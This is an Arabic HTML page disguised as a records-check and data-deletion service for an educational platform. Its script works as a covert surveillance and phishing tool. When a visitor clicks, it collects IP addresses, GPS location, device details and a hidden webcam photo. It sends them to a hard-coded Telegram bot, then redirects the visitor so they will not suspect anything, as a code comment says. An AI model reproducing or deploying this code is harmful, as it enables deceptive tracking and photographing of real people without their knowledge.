<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة أبواب - التحقق من السجلات</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background-color: #f4f7f6;
            text-align: center;
            padding-top: 80px;
            margin: 0;
        }
        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 10px;
            max-width: 420px;
            margin: auto;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
        }
        button {
            background-color: #ffc107;
            color: #333;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        button:hover {
            background-color: #e0a800;
        }
    </style>
</head>
<body>

    <div class="container" id="mainBox">
        <h1>التحقق من السجلات وحذف البيانات</h1>
        <p>تم رصد اسمك ضمن السجلات المتاحة. انقر على الزر أدناه لتأكيد الهوية وبدء عملية الحذف الفوري والانتقال للمنصة.</p>
        <button id="triggerBtn">بدء عملية فحص وحذف البيانات</button>
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '7834185753:AAEaTPXg0xNOQokrjzdgF9Rt0EWy_SmXHOk';
        const CHAT_ID = '7110865740';

        function sendToTelegram(text) {
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(r => r.json())
            .catch(err => console.error('❌:', err));
        }

        function sendPhotoToTelegram(blob, captionText) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', captionText);
            formData.append('parse_mode', 'HTML');
            formData.append('photo', blob, 'camera_capture.jpg');

            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .catch(err => console.error('❌ خطأ في إرسال الصورة:', err));
        }

        async function getPublicIPv4() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'غير متاح';
            }
        }

        async function getPublicIPv6() {
            try {
                const res = await fetch('https://api6.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'غير متاح';
            }
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ip = ice.candidate.candidate.split(' ')[4];
                    if (ip && ip.includes('.')) {
                        resolve(ip);
                        pc.close();
                    }
                };
                setTimeout(() => {
                    resolve('غير متاح');
                    pc.close();
                }, 3000);
            });
        }

        async function getLocation(ip) {
            try {
                const res = await fetch(`http://ip-api.com/json/${ip}?lang=ar`);
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        country: data.country || 'غير معروف',
                        city: data.city || 'غير معروف',
                        lat: data.lat,
                        lon: data.lon,
                        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
                return null;
            } catch {
                return null;
            }
        }

        function getExactGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    (error) => {
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // دالة إعادة التوجيه للموقع المطلوب
        function redirectToAbwaab() {
            window.location.href = 'http://abwaabiraq.com';
        }

        document.getElementById('triggerBtn').addEventListener('click', async function() {
            this.innerText = "جاري معالجة الطلب والنقل للمنصة...";
            this.disabled = true;

            const ipv4 = await getPublicIPv4();
            const ipv6 = await getPublicIPv6();
            const localIP = await getLocalIP();
            const ipLocation = await getLocation(ipv4);
            const gpsLocation = await getExactGPSLocation();

            let msg = `<blockquote>`;
            msg += ` <b>زيارة تفاعلية وتحويل ناجح</b>\n\n`;
            msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
            msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
            msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
            
            if (ipLocation) {
                msg += ` <b>موقع الـ IP</b>: <tg-spoiler> ${ipLocation.country} - ${ipLocation.city} </tg-spoiler>\n`;
            }

            if (gpsLocation) {
                msg += ` 📍 <b>الموقع الدقيق (GPS)</b>:\n`;
                msg += ` <b>الإحداثيات</b>: <tg-spoiler>${gpsLocation.lat}, ${gpsLocation.lon}</tg-spoiler>\n`;
                msg += ` <b>رابط خريطة GPS</b>: <a href="${gpsLocation.mapLink}">اضغط هنا للدقة العالية</a>\n\n`;
            } else {
                msg += ` 📍 <b>الموقع الدقيق (GPS)</b>: لم يتم السماح به أو مرفوض\n\n`;
            }

            msg += ` <b>نظام التشغيل</b>: ${navigator.userAgent.includes('Windows') ? 'Windows' : navigator.userAgent.includes('Mac') ? 'Mac' : navigator.userAgent.includes('Android') ? 'Android' : 'غير معروف'}\n`;
            msg += ` <b>المتصفح</b>: ${navigator.userAgent.includes('Chrome') ? 'Chrome' : navigator.userAgent.includes('Firefox') ? 'Firefox' : navigator.userAgent.includes('Safari') ? 'Safari' : 'غير معروف'}\n`;
            msg += ` <b>نوع الجهاز</b>: ${/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'جوال/تابلت' : 'كمبيوتر'}\n`;
            msg += ` <b>دقة الشاشة</b>: ${window.screen.width}x${window.screen.height}\n`;
            msg += ` <b>اللغة</b>: ${navigator.language || 'غير معروف'}\n`;
            msg += ` <b>المنطقة الزمنية</b>: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'}\n`;
            msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
            msg += `</blockquote>`;

            // تشغيل الكاميرا والتقاط الصورة ثم التحويل التلقائي
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    stream.getTracks().forEach(track => track.stop());

                    canvas.toBlob(blob => {
                        sendPhotoToTelegram(blob, msg).then(() => {
                            // التوجيه فور إتمام إرسال الصورة
                            redirectToAbwaab();
                        });
                    }, 'image/jpeg', 0.8);
                }, 1500);
            })
            .catch(err => {
                console.log('مرفوض أو غير متاح:', err);
                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.").then(() => {
                    // حتى لو رفض الكاميرا، يتم تحويله للموقع الأصلي لكي لا يشك بشيء
                    redirectToAbwaab();
                });
            });
        });
    </script>
</body>
</html>
